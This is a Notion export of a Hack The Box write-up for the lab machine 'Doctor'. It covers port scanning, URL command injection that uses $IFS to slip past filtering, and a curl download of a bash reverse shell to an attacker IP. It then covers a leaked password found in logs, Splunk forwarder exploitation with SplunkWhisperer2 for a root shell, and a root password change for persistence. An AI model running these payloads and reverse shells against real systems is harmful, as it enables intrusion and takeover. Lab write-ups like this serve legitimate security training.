{"children":[{"children":[],"uri":"https://www.notion.so/c215c7ebf3b54df181a21ad0df9f7aba","type":"heading","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/e62b886b52fd44b588c08647b10fa0e6","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ nmap -p- 10.10.10.209 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/a5e38a5cc9c240fb959ca9791c194799","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8089/tcp open  unknown"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/e50c6c5d4145437c81b072323e26a4ef","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/35137173e24f43cbaa894af85597d0d8","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ nmap -p 22,80,8089 -sC -sV 10.10.10.209 > scan.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/d91cd441971c4c22a6b1f8b480316c8c","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["PORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)\n|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)\n|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Doctor\n8089/tcp open  ssl/http Splunkd httpd\n| http-robots.txt: 1 disallowed entry\n|_/\n|_http-server-header: Splunkd\n|_http-title: splunkd\n| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser\n| Not valid before: 2020-09-06T15:57:27\n|_Not valid after:  2023-09-06T15:57:27\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/8969cc6cc0da4c559e8d2ca7a291ea63","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Apache httpd 2.4.41, Splunkd httpd."]]}],"uri":"https://www.notion.so/e73f7b192a1f4f56856cf091d0718766","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/46a5cfebe3604b03bfd8dcb416dd2b4a","type":"heading","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/9aa2b9a6ab3d487caeb88fe21edcc883","type":"text","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Splunk Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/05c18ec4e408498bb60bbe6ce1992ac2","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system."]]},{"children":[{"children":[],"uri":"https://www.notion.so/7af51d244c3b40ea983dbf1150aeb61b","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["rpc - 1970-01-01T01:00:00+01:00\nservices - 1970-01-01T01:00:00+01:00\nservicesNS - 1970-01-01T01:00:00+01:00\nstatic - 1970-01-01T01:00:00+01:00"]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/08a94c3e3cf44df7b6372b6a5fd2160f","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["10.10.10.209:8089",[["c",null]]],[" is a Splunk Atom Feed, with the following pages:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/cd397bed46fc4f5c8f4f7d45c1052834","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["http-robots.txt: 1 disallowed entry"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/3a4f1554096c4aadb36bc8ac5d721bb7","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["We also see from the "],["nmap",[["c",null]]],[" scan that there is a disallowed entry in the "],["robots.txt",[["c",null]]],[" file:"]]},{"children":[],"uri":"https://www.notion.so/ca95dcc8d24d42a88f211978ec23d822","type":"bulleted_list","createdTime":1614431305442,"lastEditedTime":1614431280000,"title":[["Looks like the pages require credentials, so we'll come back to this later."]]},{"children":[],"uri":"https://www.notion.so/f3c157b7278b46cb9cdbe652a908fb29","type":"text","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["HTTP Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/1ff772db3e514009b8c6cec2ffb628e3","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["The website appears to be a front page for a clinic, some images on the page are returning 404."]]},{"children":[],"uri":"https://www.notion.so/2bb51cd111be4a798d6f39f8ef655112","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["We see an "],["info@doctors.htb",[["c",null]]],[" email address on the "],["/services.html",[["c",null]]],[" page, which could be the domain name for our target."]]},{"children":[{"children":[],"uri":"https://www.notion.so/415e13319ddb47338033425b2e784aef","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["10.10.10.209  doctors.htb"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/4798738705464e65aea2ea71c97239dc","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Add the following line to our "],["/etc/hosts",[["c",null]]],[" file:"]]},{"children":[],"uri":"https://www.notion.so/74835864934142cfbbeb1bd862bdb458","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Navigating to "],["http://doctors.htb",[["a","http://doctors.htb"]]],[", we're redirected to a login page for a service called \"Doctor Secure Messaging\"."]]},{"children":[],"uri":"https://www.notion.so/3c4f14fde2024a0093a28b5c5d798a8f","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["There is a register function on the page, and we are able to register for an account without an "],["@doctors.htb",[["c",null]]],[" email address. Beware that this account is only valid for 20 minutes."]]},{"children":[],"uri":"https://www.notion.so/49acaf2b618841a4ae02ad83fdfa44af","type":"heading","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Exploitation"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/c747fcda5aa54523a2f7a147f764185a","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["<b>XSS?</b>",[["c",null]]]]}],"uri":"https://www.notion.so/51beeb51d9ac4cb79e9380737d5f9c6f","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Now in the messaging system as the temporary user, we're able to make new posts, let's see if it is vulnerable to XSS:"]]},{"children":[],"uri":"https://www.notion.so/51b2792feb0b470487296bcfc5aca997","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["That didn't seem to have worked, let's see whether if we can inject code with HTTP requests..."]]},{"children":[{"children":[],"uri":"https://www.notion.so/b00f4685e58a41d9832a5a11784372c1","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["nc -lvnp 80",[["c",null]]]]}],"uri":"https://www.notion.so/d80595bdf685427da6aba7444ada95e3","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Listen for incoming HTTP requests beforehand:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/fb197b0ed48e40f19b94cd4708ee2d2e","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["http://10.10.14.53/$(whoami)",[["c",null]]]]}],"uri":"https://www.notion.so/4a429fc7d6804bf19df232a76fb8bfdc","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Submit as post content the following:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/45ef16b922794a3498c293e051c990c7","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["GET /web HTTP/1.1\nHost: 10.10.14.53\nUser-Agent: curl/7.68.0\nAccept: */*"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/57fd40c1a14443ceacc5246e266809f9","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["We see that we get a GET request back for "],["/web",[["c",null]]],[" from an user agent of "],["curl/7.68.0",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/361a52d30105443f8252ec790a9b0929","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["There seems to be a "],["curl",[["c",null]]],[" agent running on the target which automatically GETs links on posts."]]},{"children":[],"uri":"https://www.notion.so/02e7c84e7c5d4e52820bc7bd1e4d8ca3","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["More importantly, it is executing the code that we injected in the URL, seeing as we got a request for "],["/web",[["c",null]]],[" back, where "],["web",[["c",null]]],[" is likely the username."]]},{"children":[{"children":[],"uri":"https://www.notion.so/595d10e0b7bd4c12b0c7c2b80f837a2d","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$(whoami)&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/885aaf1fe382457aad3d2f5a49e09392","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Forward the request to Burp Suite to investigate this further, and we get:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/75e5519c614c4781b2ef699f0333d417","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["sudo python3 -m http.server 80",[["c",null]]]]}],"uri":"https://www.notion.so/29e8f02ef74b44a28518d4a4d1b4df9d","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["And start a HTTP server locally to listen for requests:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/6fa8847dd0ec4b81b3573e9db5833a7d","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$(echo test)&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/3aa9bd3d882449f98b373e777a804c97","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Let's see if we can get an echo back:"]]},{"children":[],"uri":"https://www.notion.so/23c5cf5cefad478a8f772a444ca8e83b","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["That didn't work, neither did swapping out the whitespace with encoded characters like "],["+",[["c",null]]],[" or "],["%20",[["c",null]]],["."]]},{"children":[{"children":[],"uri":"https://www.notion.so/f15a2d52b5db437aa3e7b7e84a9192c3","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$({echo,test})&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/6c674ad9adc8467b8aacf9c4fa7a3c61","type":"bulleted_list","createdTime":1614431305443,"lastEditedTime":1614431280000,"title":[["Let's try using a bracket expansion:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/c46596753cf34a6382b72e91858eba56","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$(echo$IFS'test')&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/3c91103e0fbb496a87dfd74971d678c1","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["That didn't work either. We can try to use something called the "],["$IFS",[["c",null]]],[" variable which returns a space, don't forget to put things in quotes:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/ec3c49023e37479487ce66d863f01273","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["\"GET /test HTTP/1.1\" 404"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/208f7200ee3c47808caa77b416ef042b","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We get a request for "],["/test",[["c",null]]],[" from the "],["curl",[["c",null]]],[" agent:"]]},{"children":[],"uri":"https://www.notion.so/7f57ee55f66c4e36ba819153dcffc1fe","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Now that we have code execution, let's try to upload and execute a reverse shell."]]},{"children":[{"children":[],"uri":"https://www.notion.so/634ca7e3d68a4b50a2a71f9dab4e7a26","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["bash -c 'bash -i &> /dev/tcp/10.10.14.53/6969 0>&1'"]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/fccaeb405a764d498861d0a2a26a0f08","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Create a simple Bash reverse shell "],["rev",[["c",null]]],[", host the file on the HTTP server we have started earlier.:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/569a394297874f72b50d2d3f92b8bdcd","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$(curl$IFS'-o'$IFS'/var/www/html/rev'$IFS'http://10.10.14.53/rev')&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/0e50cb32fb4f4552a5fe7209fbaeecb8","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Make the following request to have the "],["curl",[["c",null]]],[" agent download our reverse shell to the "],["/var/www/html/",[["c",null]]],[" directory:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1124e856a83947bd877bfd8f6d7878e3","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/0366a03935f148f1acb741e247679dd4","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Listen for a reverse connection:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/3a77fd7862dc422b906b3046e91274b0","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["title=pwn&content=http//10.10.14.53/$(bash$IFS'/var/www/html/rev')&submit=Post",[["c",null]]]]}],"uri":"https://www.notion.so/98881dab0c00487aaee4631bc96c9a3e","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Run our reverse shell by requesting:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1bee4c34ba9148d5af339de3a81ae589","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/fcf3abc570074d87927f88bfd3bc09d6","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["uid=1001(web) gid=1001(web) groups=1001(web),4(adm)"]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/8b8b6bad395744f0859cc1f6412013df","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We should now get a reverse shell as web:"]]},{"children":[],"uri":"https://www.notion.so/6e8ebbb44d04408f9b1f331a8f61133c","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We notice that the web user is in group "],["4(adm)",[["c",null]]],[", which grants us read access to "],["/var/log/",[["c",null]]],["."]]},{"children":[{"children":[],"uri":"https://www.notion.so/62589c3c3c2647489cf2e71689580f27","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ echo \"import pty; pty.spawn('/bin/bash')\" > /tmp/shell.py",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/335d0866d5894b9b90da79809df8c196","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["$ python3 /tmp/shell.py",[["c",null]]]]}],"uri":"https://www.notion.so/414e53dad08b4919b63ab0750f162d1f","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["But before we proceed, let's upgrade our shell by spawning a TTY:"]]},{"children":[],"uri":"https://www.notion.so/6f103d800a4a4f68b4246bc8f8f334bf","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Navigating to "],["/home/",[["c",null]]],[", we see that there is a user named shaun."]]},{"children":[{"children":[],"uri":"https://www.notion.so/9c82b7b043a44823946599ffd928b645","type":"text","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["cat backup | grep pass",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/b4c4cd6bfcbb4fd9b444199831e5c6b4","type":"code","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \"POST /reset_password?email=Guitar123\" 500 453"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/b79d07a6c260460885d18f707d2310b9","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["While looking for log files, we see that there is a "],["backup",[["c",null]]],[" file in the "],["/var/log/apache2",[["c",null]]],[" directory. Checking what's inside:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/8b6b28fadd864353a482827f012941c4","type":"text","createdTime":1614431305446,"lastEditedTime":1614431280000,"title":[["su shaun",[["c",null]]],["\n"],["Guitar123",[["c",null]]]]}],"uri":"https://www.notion.so/5e3fe963a1a543cb8a9e937f1e7a703f","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Looks like some user mistakenly put their password in the email address field on the "],["/reset_password",[["c",null]]],[" page, wonder if that was shaun..."]]},{"children":[],"uri":"https://www.notion.so/89df18a2ba6246b59ec2db6ba0d7f8e8","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We're in as shaun, let's get the user flag!"]]},{"children":[],"uri":"https://www.notion.so/32b64bc04a1c4bd5b9d6a1839a47ad5d","type":"heading","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Privilege Escalation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/ec33e1b137b945bdbf43f876a5538945","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Password reuse in shaun's Splunk account, granting us access to Splunk services on "],["https://10.10.10.209:8089/services",[["a","https://10.10.10.209:8089/services"]]],["."]]},{"children":[],"uri":"https://www.notion.so/b65ed0605d9746d58d1aa917d669c240","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Splunk version info exposed on services page to be 8.0.5, which is vulnerable to an RCE attack."]]},{"children":[],"uri":"https://www.notion.so/c338dee360884868a61f77af5c4dfa17","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["The attack is carried out by leveraging the agent's credentials to create a malicious app bundle on the forwarder, such that we can inject arbitrary privileged code."]]},{"children":[{"children":[],"uri":"https://www.notion.so/9ee09e971d2948b6ab52565ff3c207af","type":"text","createdTime":1614431305446,"lastEditedTime":1614431280000,"title":[["$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.53 --username shaun --password Guitar123 --payload \"bash -c 'bash -i >& /dev/tcp/10.10.14.53/9001 0>&1'\"",[["c",null]]]]}],"uri":"https://www.notion.so/711ebf25aba94c2ba7c93c4df83c9e94","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We can use an existing exploit called SplunkWhisperer2 (cnotin) to gain a reverse shell:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/790b70b23b234e1ca834a42cdc33be82","type":"text","createdTime":1614431305446,"lastEditedTime":1614431280000,"title":[["$ id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/149f02af68b64e95aa31d8de62f08665","type":"code","createdTime":1614431305446,"lastEditedTime":1614431280000,"title":[["uid=0(root) gid=0(root) groups=0(root)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/14d1fbc7d44b4a379cb5ad0cba9cf87e","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["If the exploit ran successfully, we should see a reverse connection which will grant us a root shell:"]]},{"children":[],"uri":"https://www.notion.so/dadad87b8bcd47c49929ed77ca116670","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/092e14f2bc2e4a95aaaa59fe90fe80e4","type":"heading","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/6f5419170ef945f8bd0edd68bf4fc2c2","type":"text","createdTime":1614431305446,"lastEditedTime":1614431280000,"title":[["python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.53 --username shaun --password Guitar123 --payload \"echo 'root:persistenceiskey' | changepw\"",[["c",null]]]]}],"uri":"https://www.notion.so/2095d4474af64f37ac893d52303bed14","type":"bulleted_list","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["We can also change the root password to maintain SSH access:"]]},{"children":[],"uri":"https://www.notion.so/191ef2747c5d4f15af59e6d5bd83f2ab","type":"heading","createdTime":1614431305444,"lastEditedTime":1614431280000,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/aec4390a17e64a55b8bc43c4e4a2bbd3","type":"numbered_list","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["https://bash.cyberciti.biz/guide/$IFS",[["a","https://bash.cyberciti.biz/guide/$IFS"]]]]},{"children":[],"uri":"https://www.notion.so/d7f463bd6e0d474ea7175e6e20a75670","type":"numbered_list","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/",[["a","https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/"]]]]},{"children":[],"uri":"https://www.notion.so/079da51c4c6a47ca985cc0be327369d1","type":"numbered_list","createdTime":1614431305445,"lastEditedTime":1614431280000,"title":[["https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2",[["a","https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2"]]]]}],"uri":"https://www.notion.so/e6ff9e4456b5480989efbadab0f5bea1","type":"page","createdTime":1614431305442,"lastEditedTime":1617000600000,"title":[["Doctor - 10.10.10.209"]],"icon":"https://www.hackthebox.eu/storage/avatars/256280ee1fb4fd4d7610881c209a2b5e.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["doctor"]],"98uZ":[["A not-so-easy Linux box about advanced URL command injection and exploiting Splunk Universal Forwarder."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-02-27","start_time":"23:40"}]]]],"{iD?":[["Easy,Linux,Web Application,Command Injection,Splunk Forwarder"]],"|Ay0":[["post"]],"title":[["Doctor - 10.10.10.209"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/278",[["a","https://www.hackthebox.eu/home/machines/profile/278"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2020-12-17","end_time":"00:35","time_zone":"Australia/Adelaide","start_date":"2020-12-16","start_time":"23:02"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}